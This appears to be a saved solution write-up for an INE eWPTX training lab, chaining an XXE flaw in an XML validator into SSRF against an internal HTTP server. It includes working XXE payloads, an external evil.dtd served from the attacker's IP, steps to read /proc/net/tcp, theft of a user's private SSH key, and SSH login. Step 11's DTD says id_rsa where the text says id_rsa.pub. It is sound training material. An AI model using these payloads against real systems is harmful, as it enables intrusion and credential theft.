2026-02-05 09:10

Status:

Tags:[[eWPTX]][[Tags/XML|XML]]
###### Prerequisites: 
# SSRF TO RCE BY XXE
# Solution

**Step 1:** Open the lab link to access the Kali GUI instance.

![[Pics/INE/1_7a0a44c110.png]]

**Step 2:** Check if the provided machine/domain is reachable.

**Command:**

```
ping -c3 demo.ine.local
```

![[Pics/INE/2_3cb051fb70.png]]

The provided machine is reachable.

**Step 3:** Check open ports on the provided machine.

**Command:**

```
nmap -sS -sV demo.ine.local
```

![[Pics/INE/3_0d414e0f93.png]]

![[Pics/INE/3_1_eddcaaddd6.png]]

Ports 22 (SSH), 5000, and 8000 (Python-based HTTP server) are open on the target machine. As mentioned in the challenge description, the vulnerable web application is available on port 5000.

Also, if you check the output from Nmap, you will find out the fingerprint for the service running at port 5000. It contains the HTTP response.

**Step 4:** Check the web application available on port 5000.

Open the following URL in the browser:

**URL:** http://demo.ine.local:5000

![[Pics/INE/4_7fd200f1fb.png]]

An XML Validator application is available on port 5000.

Send the following XML snippet for validation:

```
<?xml version="1.0" encoding="UTF-8"?>
<parent>
    <child>
        <name>Test Name</name>
        <description>Test Description</description>
    </child>
</parent>
```

![[Pics/INE/4_1_b0de31bbbf.png]]

Click on the **Validate XML** button:

![[Pics/INE/4_2_2e6a87bbc7.png]]

The response indicates that the supplied XML is valid.

Notice that the supplied XML is also reflected in the response.

**Step 5:** Identify and exploit the XXE vulnerability.

Send the following XML snippet containing an XML entity:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY desc "Test Description"> ]>
<parent>
    <child>
        <name>Test Name</name>
        <description>&desc;</description>
    </child>
</parent>
```

![[Pics/INE/5_b86af6df1a.png]]

Notice the response contains the description specified in the XML entity!

Not that we know there is an XXE vulnerability; let's leverage it to pull information on the internal services running on the target machine.

Use the following XML snippet to read the contents of the `/proc/net/tcp` file:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE data [
    <!ENTITY file SYSTEM "file:///proc/net/tcp">
]>
<data>&file;</data>
```

**Information:** The `/proc/net/tcp` file contains information on the current TCP network connections.

![[Pics/INE/5_1_6dfe9b6901.png]]

![[Pics/INE/5_2_4302b7b564.png]]

Notice we got back the file contents!

**Contents of the `/proc/net/tcp` file**:

```
sl local_address rem_address st tx_queue rx_queue tr tm->when retrnsmt uid timeout inode
0: 00000000:0016 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74435656 1 0000000000000000 100 0 0 10 0
1: 0100007F:22B8 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74418007 1 0000000000000000 100 0 0 10 0
2: 0B00007F:9599 00000000:0000 0A 00000000:00000000 00:00000000 00000000 65534 0 74430920 1 0000000000000000 100 0 0 10 0
3: 00000000:1F40 00000000:0000 0A 00000000:00000000 00:00000000 00000000 0 0 74434697 1 0000000000000000 100 0 0 10 0
4: 034CDCC0:1F40 024CDCC0:EB4C 06 00000000:00000000 03:0000176F 00000000 0 0 0 3 0000000000000000
5: 034CDCC0:1F40 024CDCC0:EB4E 01 00000000:00000000 00:00000000 00000000 0 0 74434828 1 0000000000000000 20 4 30 10 -1
```

**Note:** The information you received would differ slightly since the IP addresses of the machines change at every lab launch. Kindly make sure to fetch the contents of the above file before proceeding.

**Step 6:** Decode the IP addresses and port numbers retrieved from the `/proc/net/tcp` file.

Use the following Python script to convert the IP addresses in hex to dotted-decimal notation:

**convert.py:**  

```
import socket
import struct
hex_ip = input("Enter IP (in hex): ")
addr_long = int(hex_ip, 16)
print("IP in dotted-decimal notation:", socket.inet_ntoa(struct.pack("<L", addr_long)))
```

![[Pics/INE/6_e9f72a73d7.png]]

Convert the hex IP addresses received from `/proc/net/tcp` file:

**Command:**  

```
python3 convert.py 
```

![[Pics/INE/6_1_1b8de66a32.png]]

Once all the IP addresses are converted, look for the internal IPs. In this case, it's `127.0.0.1` and `127.0.0.11`.

Let's also convert the ports from hex to decimal system:

**Commands:**

```
python3
0x0016
0x22B8
0x9599
0x1F40
```

![[Pics/INE/6_2_0b5b1b9651.png]]

The ports corresponding to internal IPs are 8000 and 38297, respectively.

**Step 7:** Perform an SSRF attack to interact with internal services.

Check the IP address of the attacker machine:

**Command:**

```
ip addr
```

![[Pics/INE/7_35f08da799.png]]

The IP address of the attacker machine is `192.220.76.2`.

**Note:** The IP address of the machines is bound to change with every lab start. Kindly make sure to get the correct IP address before moving on to the next steps. Failing to do that would result in failed exploitation attempts.

We will send the following XML snippet to the vulnerable web application:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```

**Note:** Kindly make sure to replace the IP address in the above payload.

![[Pics/INE/7_1_1db866a8a5.png]]

Before sending the above XXE payload, save the following snippet as `evil.dtd`:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

![[Pics/INE/7_2_0f55833188.png]]

Start a Python-based HTTP server on port 8080:

**Command:**  

```
python3 -m http.server 8080
```

![[Pics/INE/7_3_abe6a3ed5f.png]]

**Information on the payload:**

The first payload (sent to the web app for validation) would load the contents of the `evil.dtd` file from the attacker machine and then this file would be parsed by the backend.

The `evil.dtd` file contains the entity that sends a request to `localhost:8888` and the result is embedded within the CDATA section.

**Information on CDATA:** CDATA sections can be used to "block escape" literal text when replacing prohibited characters with entity references is undesirable.

**Reference:** https://www.w3resource.com/xml/CDATA-sections.php

Some examples of prohibited characters are `<`, `>`, `&`, `"`, `'`.

So, the above payload makes sure that if the response does contain some restricted characters, those characters will get embedded into the CDATA section, and hence the XML validator will raise no errors.

Now we are ready to send the XXE payload:

![[Pics/INE/7_4_32a12d768c.png]]

![[Pics/INE/7_5_edf9f0c44c.png]]

Notice the response contains a directory listing. It must be some sort of HTTP server.

The response indicates the presence of files like **flag1** and directories like **.ssh**.

Head back to the terminal running the Python-based HTTP server:

![[Pics/INE/7_6_9a954d7267.png]]

Notice there was a request from the target machine to fetch the `evil.dtd` file.

Save the HTML contents received from the internal HTTP server:

**Command:**  

```
cat listing.html
```

![[Pics/INE/7_7_8903c0e729.png]]

Open the `listing.html` file in the browser:

**URL:**  

```
file:///root/listing.html
```

![[Pics/INE/7_8_e39ac21e15.png]]

Notice there are 2 entries: **.ssh/** and **flag1**.

Let's fetch these in the subsequent steps.

**Note:** The other internal port open on the machine won't return any information. You are encouraged to interact with it by modifying the `evil.dtd` file to contain the IP and port on which that service is running.

**Step 8:** Retrieve the first flag via XXE.

Modify the `evil.dtd` file to fetch the contents of file `flag1`:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/flag1">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

![[Pics/INE/8_b79a9d97cb.png]]

Start a Python-based HTTP server on port 8080:

**Command:**  

```
python3 -m http.server 8080
```

![[Pics/INE/8_1_13b72b31b0.png]]

Send the same XXE payload we sent in the last step:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```

![[Pics/INE/8_2_c1aa0afc4e.png]]

The contents of `flag1` file are retrieved:

**Flag 1:** 5f1210be00b4b8dfecba7b56181d905c

Head back to the terminal running the Python-based HTTP server:

![[Pics/INE/8_3_cd2babc925.png]]

Notice there was a request from the target machine to fetch the `evil.dtd` file.

**Step 9:** Fetch the contents of the **.ssh** directory.

Modify the `evil.dtd` file to fetch the contents of `.ssh` directory:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/.ssh/">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

![[Pics/INE/9_ecf4cc94e1.png]]

Start a Python-based HTTP server on port 8080:

**Command:**  

```
python3 -m http.server 8080
```

![[Pics/INE/9_1_c35ae9db0d.png]]

Send the same XXE payload we sent in the last step:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```

![[Pics/INE/9_2_f4c66bbcfb.png]]

The directory listing for **.ssh** directory is retrieved:

![[Pics/INE/9_3_c2bce82a34.png]]

Save the retrieved HTML contents:

**Command:**  

```
cat listing.html
```

![[Pics/INE/9_4_e93919ddce.png]]

Open the `listing.html` file in the browser:

**URL:**  

```
file:///root/listing.html
```

![[Pics/INE/9_5_13ad44e63a.png]]

Notice there are three files in the **.ssh** directory:

- authorized_keys
- id_rsa
- id_rsa.pub

In the subsequent steps, we will fetch some of these files.

**Step 10:** Retrieve the private SSH keys.

Modify the `evil.dtd` file to fetch the contents of `id_rsa` file:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

![[Pics/INE/10_16340298de.png]]

Start a Python-based HTTP server on port 8080:

**Command:**  

```
python3 -m http.server 8080
```

![[Pics/INE/10_1_0665590cb3.png]]

Send the same XXE payload we sent in the last step:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```

![[Pics/INE/10_2_6ba430d8bc.png]]

The response contains the private SSH keys.

![[Pics/INE/10_3_3972e3e8a3.png]]

Save the contents of the private keys to the `id_rsa` file:

**Command:**  

```
cat id_rsa
```

![[Pics/INE/10_4_fd0bf39dce.png]]

The private SSH key is missing the new lines.

To restore the file, we can use the following command:

**Command:**  

```
sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/" \
    -e "s/-----END RSA PRIVATE KEY-----/\n&/" \
    -e "s/\S\{64\}/&\n/g" \
    id_rsa
```

![[Pics/INE/10_5_ee14449c21.png]]

![[Pics/INE/10_6_ef8a3cbe41.png]]

The output contains the properly-formatted private SSH key.

The above command does the following: - Adds a new line after the `-----BEGIN RSA PRIVATE KEY-----` string - Adds a new line before the `-----END RSA PRIVATE KEY-----` string - For all other string blocks, it adds a new line after every 64 characters

Use the following command to save the formatted private key to the file `fixed_id_rsa`:

**Command:**  

```
sed -e "s/-----BEGIN RSA PRIVATE KEY-----/&\n/" \
    -e "s/-----END RSA PRIVATE KEY-----/\n&/" \
    -e "s/\S\{64\}/&\n/g" \
    id_rsa > fixed_id_rsa
```

![[Pics/INE/10_7_f42984c7ef.png]]

Check the contents of the `fixed_id_rsa` file:

**Command:**  

```
cat fixed_id_rsa
```

![[Pics/INE/10_8_aa2d093595.png]]

The well-formatted private SSH key has been placed in a file.

**Step 11:** Gain SSH access on the target machine.

We have the private SSH key but don't yet know the user to whom it belongs.

To use the SSH keys for login, we have to find out the corresponding user name. For that, we will be using the public SSH keys. This file could contain the email of the user or the account name followed by the hostname. In either case, we will find the user name.

Modify the `evil.dtd` file to fetch the contents of the `id_rsa.pub` file:

```
<!ENTITY % start "<![CDATA[">
<!ENTITY % file SYSTEM "http://localhost:8888/.ssh/id_rsa">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents '%start;%file;%end;'>">
```

![[Pics/INE/11_4fe1028aeb.png]]

Start a Python-based HTTP server on port 8080:

**Command:**  

```
python3 -m http.server 8080
```

![[Pics/INE/11_1_69e058b364.png]]

Send the same XXE payload we sent in the last step:

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
    <!ENTITY % dtd SYSTEM "http://192.220.76.2:8080/evil.dtd">
    %dtd;
    %all;
]>
<data>&fileContents;</data>
```

![[Pics/INE/11_2_058d38e897.png]]

The contents of the public SSH key were successfully retrieved.

![[Pics/INE/11_3_ea74c9ad88.png]]

The email id of the user is also revealed: `david@insecure-corp.com`

Modify the permissions of the `fixed_id_rsa` file and SSH into the target machine:

**Commands:**  

```
chmod 600 fixed_id_rsa
ssh -i fixed_id_rsa david@demo.ine.local
```

![[Pics/INE/11_4_13f1cec5aa.png]]

SSH login was successful!

**Step 12:** Retrieve the second flag.

Now that we have SSH access to the target machine, we can issue commands to perform recon and retrieve all the flags.

**Commands:**  

```
id
ls
cat flag1 
find / -iname 'flag*' 2>/dev/null 
```

![[Pics/INE/12_646148de60.png]]

**Flag 1 (/home/david/flag1):** 5f1210be00b4b8dfecba7b56181d905c

Flag 2 is stored in `/tmp/flag2` file:

**Command:**  

```
cat /tmp/flag2
```

![[Pics/INE/12_1_f79598531b.png]]

**Flag 2:** 173b0344950d28e8b5dc36dd462edaa9

With that, we conclude this lab. We have learned to leverage an XXE vulnerability to perform an SSRF attack. Using the SSRF attack, we interacted with an internal HTTP server, got hold of SSH keys for a user, and got shell access on the target machine.

# References

- [A4:2017-XML External Entities (XXE)](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A4-XML_External_Entities_\(XXE\))
- [A10:2021 – Server-Side Request Forgery (SSRF)](https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/)
- [XML CDATA](https://www.w3resource.com/xml/CDATA-sections.php)

## Not running

For the best experience, choose the region closest to you. Then, start the lab to begin.

Select the region closest to you

EU-Germany

Keyboard layout:🇺🇸English (US)

Start lab